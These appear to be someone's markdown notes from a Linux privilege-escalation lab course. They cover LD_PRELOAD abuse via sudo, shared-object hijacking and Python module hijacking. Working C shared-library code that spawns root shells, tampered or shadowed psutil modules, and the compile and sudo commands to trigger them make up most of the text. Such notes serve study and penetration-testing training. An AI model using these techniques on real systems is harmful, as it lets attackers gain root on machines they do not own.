## Kernel Exploits
```shell
uname -a
```

```shell
cat /etc/lsb-release 
```
Often written in C
```shell
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```
## Shared Libraries
* Linux Programs commonly use dynamically linked shared object libraries
* Static libraries have the file extension `.a` 
* dynamic linked shared object libraries have the file extension `.so`
#### Methods to specify location of dynamic libraries.
##### Compiling Flags
* `-rpath`
* `-rpath-link`
##### Environmental Variables
* `LD_RUN_PATH` or `LD_LBRARY_PATH`
##### Location
* `/lib`
* `/usr/lib`
* Specifying another directory containing library
##### LDD_PRELOAD
* `LDD_PRELOAD` enviromental variable can load a library before executing a binary. 
* Shared objects can be viewed using
```shell
ldd /bin/ls
```
Shows all libraries required by binary along with their paths. 
#### LD_PRELOAD Priv Esc
* Need a user with `sudo` privileges
```shell
sudo -l

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

* Compile this library:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
```shell
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
```shell
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
## Shared Object Hijacking
Programs and binaries under development, usually have custom libraries associated with them.
Look for non-standard libraries
```shell
ldd <binary name>
```
Find the location of the binary
```shell
readelf -d <binary>  | grep PATH
```
Can you write to this folder?
```shell
 ls -la /development/
```
need to find a function called in the binary
```shell
cp /lib/x86_64-linux-gnu/libc.so.6 <path to called function>
```
Look to see if this library appears now
```shell
ldd <binary name>
```
```shell
./<binary name>
```
Look for a function name
Example:
```shell
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```
```shell
 gcc src.c -fPIC -shared -o <path to libary>
```
Run the binary again

## Python Library Hijacking
* Three main ways to hijack a library:
	1. Wrong wire permissions
	2. Library Path
	3. PYTHONPATH environment variable
### Wrong Write Permissions
```shell
 ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```
#### Module Permissions
```shell
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```
We can write to the python module
```shell
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

```python
def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret
```

```shell
sudo /usr/bin/python3 ./mem_status.py
```

### Library Path 
* Each version of python has a specified order in which libraries are searched and imported from. 
* The order in which they are imported is from a priority system. Paths higher on the list take priority of ones lower.
```shell
python3 -c 'import sys; print("\n".join(sys.path))'
```
```output
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```
#### Requirements
1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable. 
2. Must have write permissions to one of the paths having a higher priority on the list. 
##### Aim
if the imported module is located in a lower path on the list and a higher priority path is editable by out user, we can create a module ourselves with the same name and include our own desired functions. 

#### Example
Show where PSUTIL is installed
```shell
pip3 show psutil
```
```output
Location: /usr/local/lib/python3.8/dist-packages
```
See where `PYTHONPATH` install is 
```shell
python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```
Check if we have write permissions higher up 
```shell
ls -la /usr/lib/python3.8
```
Hijacking Python Module

Name the file as the same as the import `psutil.py`
```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```
Test
```shell
sudo /usr/bin/python3 mem_status.py
```

### PYTHONNPATH Environment Variable
* PYTHONPATH is an environmental variable that indicates what directory, python can search for modules to import.
* Check if we have permission to set environmental variables
Look for the `SETENV` flag
```shell
sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
<snip>
commands on ACADEMY-LPENIX:
(ALL : ALL)
SETENV: NOPASSWD: /usr/bin/python3
```
Add the fake imported module python script to `tmp`

Add `/tmp` to python path
```shell
 sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```


